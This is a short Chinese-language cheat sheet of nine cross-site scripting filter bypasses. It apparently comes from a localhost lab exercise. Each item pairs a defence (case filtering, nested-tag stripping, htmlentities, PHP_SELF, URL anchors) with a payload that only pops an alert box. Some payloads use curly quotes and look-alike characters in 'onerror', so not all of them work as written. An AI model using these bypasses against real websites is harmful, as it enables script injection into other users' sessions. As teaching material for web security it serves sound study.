1) 无过滤直接用常规的进行绕过
<script>alert('Eastmount')</script>

2) 绕过大小写过滤preg_replace()函数
<Script>alert('Eastmount')</scripT>

3) 双写或嵌套绕过preg_replace()函数
<sc<script>ript>alert('Eastmount')</s</script>cript>

4) 使用img标签绕过script字符串
<img src=“1” οnerrοr=“alert('Eastmount')”>

5) 编码绕过alert禁用过滤 使用JavaScript fromCharCode()
<script>eval(String.fromCharCode(97,108,101,114,116,40,39,69,97,115,116,109,111,117,110,116,39,41))</script>

6) 构造JS脚本使标签闭合绕过get传来的参数 var $a = “<?php echo $_GET["name"]; ?>”;
</script><script>alert('Eastmount')</script>
1";</script><img scr=1 οnerrοr=alert(‘Eastmount’)><script>

7) 绕过字符转义htmlentities($_GET[“name”])
’;alert(‘Eastmount’);'
Eastmount’;alert($a);//

8) 利用$_SERVER[‘PHP_SELF’]绕过字符转义htmlentities()函数
/"><script>alert('Eastmount')</script>"< "
/"><img src=1 οnerrοr=alert('Eastmount')><form

9) 绕过URL锚点(#)连接
http://localhost/xss/xss9.php#<script>alert('Eastmount')</script>
